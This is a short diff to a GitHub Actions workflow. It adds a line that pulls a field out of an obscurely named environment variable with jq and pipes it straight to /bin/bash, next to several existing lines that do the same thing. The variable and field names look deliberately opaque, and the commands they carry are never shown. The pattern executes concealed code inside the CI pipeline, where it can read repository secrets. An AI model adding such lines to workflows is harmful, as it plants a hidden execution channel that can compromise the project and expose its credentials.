@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$nolw375" | jq -r .xdrl2 | /bin/bash
           echo $iedrl2 | jq -r .og2212 | /bin/bash
           printf '%s' "$xol680" | jq -r .uf18357 | /bin/bash
+          printf '%s' "$hmt255" | jq -r .isna93 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
